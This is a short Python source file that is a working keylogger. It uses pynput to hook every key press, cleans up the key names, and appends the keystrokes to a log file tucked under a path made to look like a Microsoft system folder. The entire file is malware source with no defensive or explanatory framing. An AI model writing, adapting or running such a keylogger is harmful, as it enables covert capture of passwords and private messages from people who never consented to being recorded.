from pynput.keyboard import Listener
import re

logFile = "C:\Microsoft/key.log"

def capture(key):
	key = str(key)
	key = re.sub(r'\'', '', key)
	key = re.sub(r'Key.space', ' ', key)
	key = re.sub(r'Key.enter', '\n', key)

	with open(logFile, "a") as log:
		log.write(key)

with Listener(on_press=capture) as zankyo:
	zankyo.join()